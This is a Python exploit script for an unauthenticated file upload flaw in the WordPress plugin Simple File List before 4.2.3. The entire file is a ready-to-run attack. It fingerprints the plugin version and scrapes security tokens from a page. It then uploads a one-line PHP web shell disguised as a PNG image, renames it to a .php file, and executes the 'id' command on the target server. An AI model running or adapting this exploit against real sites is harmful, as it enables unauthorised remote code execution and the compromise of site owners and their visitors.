#!/usr/bin/env python
#
#
# simple.py
# 
# Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload RCE
# 
# Author: RandomRobbieBF

import requests
import re
import sys
import argparse
from urllib.parse import unquote
session = requests.Session()
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# Proxy to be left blank if not required.
http_proxy = ""
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }


def check_vuln(URL):
	headers = {"Origin":""+URL+"","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Encoding":"gzip, deflate","Accept":"*/*"}
	response = session.get(""+URL+"/wp-content/plugins/simple-file-list/readme.txt", headers=headers,verify=False,timeout=10,proxies=proxyDict)
	if response.status_code == 200:
		if "Simple File List gives your WordPress website a "  in response.text:
			if "4.2.3" not in response.text:
				print("Plugin looks to be vulnerable version")
			else:
				print ("Plugin appears to be patched version")
				sys.exit(1)
		else:
			print("Unable to confirm Version")
			sys.exit(1)
	else:
		print("Unable to confirm Version")
		sys.exit(1)



def upload_file(file0,timestamp,token,ListID,FileUploadDir,UploadEngineURL):
	print("Uploading Harmless File "+file0+"")
	paramsPost = {"eeSFL_Timestamp":""+timestamp+"","eeSFL_FileUploadDir":""+FileUploadDir+"","eeSFL_Token":""+token+"","eeSFL_ID":""+ListID+""}
	paramsMultipart = [('file', (''+file0+'', "<?=`$_GET[0]`?>", 'application/png'))]
	headers = {"Origin":""+URL+"","Accept":"*/*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Referer":""+URL+"/?page_id=2742","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
	response = session.post(""+UploadEngineURL+"", data=paramsPost, files=paramsMultipart, headers=headers,verify=False,timeout=10,proxies=proxyDict)
	if response.status_code == 200:
		if "SUCCESS" in response.text:
			print("Shell First Stage Upload Done")
	else:
		print("Status code:   %i" % response.status_code)
		print("Response body: %s" % response.text)



def change_ext(file0,file1,timestamp,token,ListID,FileUploadDir,UploadEngineURL,URL):
	print ("Renaming Harmless file "+file0+" to "+file1+"")
	paramsPost = {"eeFileOld":""+file0+"","eeSFL_ID":""+ListID+"","eeFileAction":"Rename|"+file1+"","eeSecurity":""+token+"","eeListFolder":"/"}
	headers = {"Origin":""+URL+"","Accept":"*/*","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+URL+"/wp-admin/admin.php?page=ee-simple-file-list","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
	response = session.post(""+URL+"/wp-content/plugins/simple-file-list/ee-file-engine.php", data=paramsPost, headers=headers,verify=False,timeout=10,proxies=proxyDict)
	if response.status_code == 200:
		if "SUCCESS" in response.text:
			print ("Shell Uploaded Try curl -sk "+URL+"/"+unquote(unquote(FileUploadDir))+""+file1+"?0=id")
			headers2 = {"User-Agent":"curl/7.55.1"}
			response2 = session.get(""+URL+"/"+unquote(unquote(FileUploadDir))+""+file1+"?0=id",headers=headers2,verify=False,timeout=10,proxies=proxyDict)
			print("Response body: %s" % response2.text)
	else:
			print("Status code:   %i" % response.status_code)
			print("Response body: %s" % response.text)
	




parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="Wordpress Url i.e https://wordpress.lan")
parser.add_argument("-f1", "--file1", required=False, default="big-bird.png", help="Harmless File Name")
parser.add_argument("-f2", "--file2", required=False, default="phpinfo.php", help="Shell File Name")
parser.add_argument("-p", "--path", required=False, default="/my-simple-file-list-page/", help="URI Path /my-simple-file-list-page/")
args = parser.parse_args()

file0 = args.file1
file1 = args.file2
PATH = args.path
URL = args.url
check_vuln(URL)
headers = {"Origin":""+URL+"","Accept":"*/*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0"}
response = session.get(""+URL+""+PATH+"", headers=headers,verify=False,timeout=10,proxies=proxyDict)
if response.status_code == 200:
	if "eeSFL" in response.text:
		try:
			timestamp = str(re.compile("eeSFL_TimeStamp =(.+?); // Security").findall(response.text)[0])
			timestamp = timestamp.replace('"','')
			timestamp = timestamp.strip()
			print ("Timestamp: "+timestamp+" ")
		except:
			print("Unable to Grab Timestamp Exiting")
			sys.exit(1)
		try:	
			token = str(re.compile("eeSFL_TimeStampMD5 =(.+?); // Security").findall(response.text)[0])
			token = token.replace('"','')
			token = token.strip()
			print ("Token: "+token+" ")
		except:
			print("Unable to Grab Token Exiting")
			sys.exit(1)
			
		try:
			ListID = str(re.compile("eeSFL_ListID = (.+?);").findall(response.text)[0])
			ListID = ListID.strip()
			print("ListID: "+ListID+"")
		except:
			print("Unable to Grab ListID")
			sys.exit(1)
			
		try:
			UploadEngineURL = str(re.compile("UploadEngineURL = (.+?);").findall(response.text)[0])
			UploadEngineURL = UploadEngineURL.replace('"','')
			print("UploadEngineURL: "+UploadEngineURL+"")
		except:
			print("Unable to Grab UploadEngineURL")
			sys.exit(1)
			
		try:
			FileUploadDir = str(re.compile("eeSFL_FileUploadDir = (.+?);").findall(response.text)[0])
			FileUploadDir = FileUploadDir.replace('"','')
			FileUploadDir = FileUploadDir.strip()
			print("FileUploadDir: "+FileUploadDir+"")
		except:
			print("Unable to Grab FileUploadDir")
			sys.exit(1)
			
		upload_file(file0,timestamp,token,ListID,FileUploadDir,UploadEngineURL)
		change_ext(file0,file1,timestamp,token,ListID,FileUploadDir,UploadEngineURL,URL)




